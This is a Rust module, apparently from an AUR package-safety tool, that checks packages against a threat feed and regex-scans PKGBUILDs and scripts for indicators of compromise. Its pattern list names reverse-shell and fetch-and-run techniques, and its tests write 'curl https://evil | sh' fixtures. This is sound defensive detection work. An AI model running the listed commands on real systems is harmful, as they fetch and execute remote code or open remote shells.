use std::sync::OnceLock;

use crate::config::Config;
use crate::feeds;

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct Verdict {
    pub name: String,
    pub malicious: bool,
    #[serde(default)]
    pub feed_hits: Vec<String>,
    #[serde(default)]
    pub ioc_hits: Vec<String>,
    /// Unión de ambas (compat con clientes viejos). Preferir `combined_reasons()`.
    #[serde(default)]
    pub reasons: Vec<String>,
}

impl Verdict {
    pub fn new(name: String, mut feed_hits: Vec<String>, mut ioc_hits: Vec<String>) -> Self {
        feed_hits.sort();
        feed_hits.dedup();
        ioc_hits.sort();
        ioc_hits.dedup();
        let mut reasons = feed_hits.clone();
        reasons.extend(ioc_hits.clone());
        reasons.sort();
        reasons.dedup();
        let malicious = !feed_hits.is_empty() || !ioc_hits.is_empty();
        Self { name, malicious, feed_hits, ioc_hits, reasons }
    }

    pub fn combined_reasons(&self) -> Vec<String> {
        if self.reasons.is_empty() {
            let mut out = self.feed_hits.clone();
            out.extend(self.ioc_hits.clone());
            out.sort();
            out.dedup();
            out
        } else {
            self.reasons.clone()
        }
    }
}

/// Tope de fichero escaneado por IOCs (compartido gate + main).
pub const MAX_SCAN_BYTES: u64 = 512 * 1024;

const IOC_PATTERNS: &[(&str, &str)] = &[
    ("descarga curl|sh", r"(?i)\bcurl\b[^\n]*\|\s*(ba)?sh\b"),
    ("descarga wget|sh", r"(?i)\bwget\b[^\n]*\|\s*(ba)?sh\b"),
    ("npm atomic-lockfile", r"(?i)\bnpm\s+(i|install|ci)\b[^\n]*atomic-lockfile"),
    ("bun js-digest", r"(?i)\bbun\s+install\b[^\n]*js-digest"),
    ("npm lockfile-js", r"(?i)\bnpm\s+(i|install|ci)\b[^\n]*(lockfile-js|nextfile-js)"),
    ("base64 -d | sh", r"(?i)base64\s*-d\b[^\n]*\|\s*(ba)?sh\b"),
    ("eval oculto", r"(?i)\beval\s+\$\([^\n]*echo\b"),
    ("reverse shell /dev/tcp", r"/dev/tcp/"),
    ("reverse shell nc -e", r"(?i)\bnc\b[^\n]*\s-[a-z]*e\s"),
    ("socat EXEC", r"(?i)\bsocat\b[^\n]*\bEXEC\b"),
    ("escritura systemd", r"(?i)/etc/systemd/system"),
    ("acceso authorized_keys", r"(?i)authorized_keys"),
    ("modificacion shell rc", r"(?i)\.(bashrc|zshrc|bash_profile|profile)\b"),
];

fn compiled_patterns() -> &'static [(String, regex::Regex)] {
    static IOC: OnceLock<Vec<(String, regex::Regex)>> = OnceLock::new();
    IOC.get_or_init(|| {
        IOC_PATTERNS
            .iter()
            .map(|(label, re)| {
                (label.to_string(), regex::Regex::new(re).expect("regex IOC invalida"))
            })
            .collect()
    })
}

fn is_interesting(file: &str) -> bool {
    let base = std::path::Path::new(file)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    if base == "PKGBUILD" || base == ".SRCINFO" {
        return true;
    }
    for ext in ["install", "sh", "bash", "zsh", "py", "pl", "rb", "patch"] {
        if base.ends_with(&format!(".{}", ext)) {
            return true;
        }
    }
    !base.contains('.')
}

pub fn scan_dir(dir: &str) -> Vec<String> {
    // Diseño: solo nivel superior (PKGBUILD/.SRCINFO/scripts). El veredicto
    // del feed cubre el paquete entero; los IOCs son señal local, no prueba.
    let mut hits = Vec::new();
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return hits,
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let fname = entry.file_name().to_string_lossy().to_string();
        if !is_interesting(&fname) {
            continue;
        }
        // No seguir symlinks: evita oráculo de lectura sobre archivos arbitrarios.
        // symlink_metadata no sigue el link (sin TOCTOU entre check y read).
        if let Ok(ft) = std::fs::symlink_metadata(&path).map(|m| m.file_type()) {
            if ft.is_symlink() {
                continue;
            }
        }
        let Ok(meta) = std::fs::symlink_metadata(&path) else { continue };
        if !meta.is_file() || meta.len() > MAX_SCAN_BYTES {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else { continue };
        if bytes.contains(&0) {
            continue;
        }
        let Ok(text) = String::from_utf8(bytes) else { continue };
        for (label, r) in compiled_patterns() {
            if r.is_match(&text) {
                hits.push(format!("{} ({})", label, fname));
            }
        }
    }
    hits.sort();
    hits.dedup();
    hits
}

/// Un dir es confinable para gate solo si canonicaliza y contiene un PKGBUILD.
/// Evita usar el gate como oráculo sobre dirs arbitrarios (`/etc`, ...).
fn confined_dir(dir: &str) -> Option<String> {
    let canon = std::fs::canonicalize(dir).ok()?;
    if !canon.is_dir() {
        return None;
    }
    if !canon.join("PKGBUILD").is_file() {
        return None;
    }
    canon.to_str().map(|s| s.to_string())
}

/// Comprueba un paquete contra el feed y, si `dir` existe, escanea su PKGBUILD con IOCs.
pub fn check(cfg: &Config, name: &str, dir: Option<&str>) -> Verdict {
    let state = feeds::load_or_empty(cfg);
    let (_, feed_hits) = feeds::feed_verdict(&state, name);
    let mut ioc_hits = Vec::new();
    if let Some(d) = dir {
        if let Some(confined) = confined_dir(d) {
            ioc_hits.extend(scan_dir(&confined));
        }
    }
    Verdict::new(name.to_string(), feed_hits, ioc_hits)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn interesting_names() {
        assert!(is_interesting("PKGBUILD"));
        assert!(is_interesting(".SRCINFO"));
        assert!(is_interesting("install"));
        assert!(is_interesting("script.sh"));
        assert!(is_interesting("setup.py"));
        assert!(is_interesting("Makefile"));
    }

    #[test]
    fn uninteresting_names() {
        assert!(!is_interesting("README.md"));
        assert!(!is_interesting(".hidden"));
        assert!(!is_interesting("LICENSE.txt"));
        assert!(!is_interesting("foo.install.bak"));
    }

    #[test]
    fn compiled_patterns_matches_ioc_patrons() {
        let patterns = compiled_patterns();
        assert_eq!(patterns.len(), IOC_PATTERNS.len());
        assert!(patterns.iter().any(|(l, _)| l == "descarga curl|sh"));
    }

    #[test]
    fn scan_dir_finds_iocs_and_skips_irrelevant() {
        let dir = std::env::temp_dir().join(format!("aur_guard_test_{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("PKGBUILD"), "eval $(echo x)\ncurl https://evil | sh\n").unwrap();
        fs::write(dir.join("README.md"), "curl https://evil | sh\n").unwrap();
        let hits = scan_dir(dir.to_str().unwrap());
        let _ = fs::remove_dir_all(&dir);
        assert!(hits.iter().any(|h| h.contains("PKGBUILD")));
        assert!(hits.iter().any(|h| h.starts_with("descarga curl|sh")));
        assert!(hits.iter().any(|h| h.starts_with("eval oculto")));
        assert!(!hits.iter().any(|h| h.contains("README.md")));
    }

    #[test]
    fn scan_dir_skips_symlinks() {
        let dir = std::env::temp_dir().join(format!("aur_guard_symlink_{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let outside = std::env::temp_dir().join(format!("aur_guard_secret_{}", std::process::id()));
        fs::write(&outside, "curl https://evil | sh\n").unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(&outside, dir.join("PKGBUILD")).unwrap();
        let hits = scan_dir(dir.to_str().unwrap());
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_file(&outside);
        assert!(hits.is_empty());
    }

    #[test]
    fn verdict_splits_feed_and_ioc() {
        let v = Verdict::new("pkg".into(), vec!["camp1".into()], vec!["eval oculto (PKGBUILD)".into()]);
        assert!(v.malicious);
        assert_eq!(v.feed_hits, vec!["camp1"]);
        assert_eq!(v.ioc_hits.len(), 1);
        assert_eq!(v.combined_reasons().len(), 2);
        let clean = Verdict::new("ok".into(), vec![], vec![]);
        assert!(!clean.malicious);
    }

    #[test]
    fn confined_dir_rejects_etc_and_accepts_build_dir() {
        assert_eq!(confined_dir("/etc"), None);
        assert_eq!(confined_dir("/no/existe/aur-guard-test"), None);
        let dir = std::env::temp_dir().join(format!("aur_guard_confined_{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        // Sin PKGBUILD se rechaza aunque exista.
        assert_eq!(confined_dir(dir.to_str().unwrap()), None);
        fs::write(dir.join("PKGBUILD"), "pkgname=foo\n").unwrap();
        assert!(confined_dir(dir.to_str().unwrap()).is_some());
        let _ = fs::remove_dir_all(&dir);
    }
}
